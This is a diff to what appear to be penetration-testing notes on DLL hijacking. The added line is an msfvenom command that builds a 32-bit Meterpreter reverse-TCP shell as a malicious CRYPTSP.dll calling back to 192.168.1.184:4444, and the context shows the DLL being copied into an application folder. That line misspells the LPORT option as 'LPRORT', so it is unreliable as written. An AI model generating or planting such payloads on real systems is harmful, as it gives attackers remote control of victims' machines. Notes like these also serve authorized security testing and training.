@@ -158,6 +158,8 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.184 LPORT=4444 -
 	LPORT			-> TCP port to listen on
 	-f dll			-> File creation type
 	-a x64			-> 64 bit dll creation
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.184 LPRORT=4444 -a x86 -f dll > CRYPTSP.dll
+	32 bit version of above
 
 Copied CRYPTSP.dll to C:\AppFolder\
 
